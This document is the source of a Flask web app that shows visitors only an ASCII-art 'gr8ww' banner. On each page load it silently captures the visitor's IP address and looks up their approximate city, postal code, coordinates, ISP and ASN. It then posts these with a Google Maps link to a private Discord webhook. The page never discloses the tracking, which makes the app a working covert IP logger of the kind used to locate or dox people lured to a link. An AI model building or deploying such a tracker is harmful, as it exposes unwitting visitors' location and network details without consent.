
import os
import ipaddress
from datetime import datetime, timezone

import requests
from flask import Flask, request

app = Flask(__name__)

# Вебхук Discord из настроек Vercel
WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK")


# Получение IP посетителя
def get_visitor_ip():
    forwarded = request.headers.get("X-Forwarded-For", "")

    ip = forwarded.split(",")[0].strip()

    if not ip:
        ip = request.remote_addr

    try:
        ipaddress.ip_address(ip)
        return ip
    except (ValueError, TypeError):
        return "Unknown"


# Приблизительная геолокация по IP
def get_location(ip):
    try:
        address = ipaddress.ip_address(ip)

        if not address.is_global:
            return {}

        response = requests.get(
            f"https://ipwho.is/{ip}",
            timeout=3
        )

        response.raise_for_status()
        data = response.json()

        if data.get("success"):
            return data

    except Exception as error:
        print("Geolocation error:", error)

    return {}


# Отправка отчёта в Discord
def send_to_discord(ip, data):
    if not WEBHOOK_URL:
        print("Discord webhook not configured")
        return

    connection = data.get("connection") or {}
    timezone_data = data.get("timezone") or {}

    def show(value):
        if value is None or value == "":
            return "Unknown"
        return str(value)

    latitude = data.get("latitude")
    longitude = data.get("longitude")

    maps = "Unavailable"

    if (
        isinstance(latitude, (int, float))
        and isinstance(longitude, (int, float))
    ):
        maps = (
            "https://www.google.com/maps"
            f"?q={latitude},{longitude}"
        )

    details = {
        "IP": ip,
        "Country": data.get("country"),
        "Country Code": data.get("country_code"),
        "Continent": data.get("continent"),
        "Region": data.get("region"),
        "City": data.get("city"),
        "Postal Code": data.get("postal"),
        "Latitude": latitude,
        "Longitude": longitude,
        "ISP": connection.get("isp"),
        "Organization": connection.get("org"),
        "ASN": connection.get("asn"),
        "Timezone": timezone_data.get("id"),
        "Time": datetime.now(
            timezone.utc
        ).strftime("%Y-%m-%d %H:%M:%S UTC")
    }

    description = "\n".join(
        f"**{key}:** {show(value)}"
        for key, value in details.items()
    )

    description += (
        f"\n\n**Google Maps:** {maps}"
        "\n*Location is approximate.*"
    )

    payload = {
        "username": "gr8ww",
        "allowed_mentions": {"parse": []},
        "embeds": [
            {
                "title": "New Website Visitor",
                "description": description[:4096],
                "color": 16777215
            }
        ]
    }

    try:
        response = requests.post(
            WEBHOOK_URL,
            json=payload,
            timeout=3
        )

        response.raise_for_status()
        print("Discord notification sent")

    except requests.RequestException as error:
        print("Discord error:", error)


# Главная страница сайта
@app.route("/")
def home():
    ip = get_visitor_ip()

    location = get_location(ip)
    send_to_discord(ip, location)

    return r"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, initial-scale=1">

    <title>gr8ww</title>

    <style>
        * {
            box-sizing: border-box;
        }

        html, body {
            margin: 0;
            width: 100%;
            min-height: 100%;
            background: #000000;
        }

        body {
            min-height: 100vh;
            min-height: 100dvh;

            display: flex;
            align-items: center;
            justify-content: center;

            overflow-x: auto;
        }

        pre {
            color: #ffffff;
            background: transparent;

            font-family: Consolas, "Courier New", monospace;
            font-size: clamp(5px, 1.25vw, 16px);
            font-weight: normal;
            line-height: 1.1;

            white-space: pre;
            margin: 0;
            padding: 16px;
            text-align: left;
        }
    </style>
</head>

<body>
<pre>
                       ,---.-,
                      '   ,'  '.
                     /   /      \
                    .   ;  ,/.  :
             __  ,-.'   |  | :  ;         .---.
  ,----._,.,' ,'/ /|'   |  ./   :        /. ./|
 /   /  ' /'  | |' ||   :       ,     .-'-. ' |
|   :     ||  |   ,' \   \     /     /___/ \: |
|   | .\  .'  :  /    ;   ,   '\  .-'.. '   ' .
.   ; ';  ||  | '    /   /      \/___/ \:     '
'   .   . |;  : |   .   ;  ,/.  :.   \  ' .\
 `---`-'| ||  , ;   '   |  | :  ; \   \   ' \ |
 .'__/\_: | ---'    '   |  ./   :  \   \  |--"
 |   :    :         |   :      /    \   \ |
  \   \  /           \   \   .'      '---"
   `--`-'             `---`-'
</pre>
</body>
</html>
"""


# Подтверждение владения сайтом для Discord
@app.route("/.well-known/discord")
def discord_verify():
    return (
        "dh=a82ad1feba4d0bdf3569765ddb00cd2b010b4d88",
        200,
        {"Content-Type": "text/plain"}
    )


if __name__ == "__main__":
    app.run()
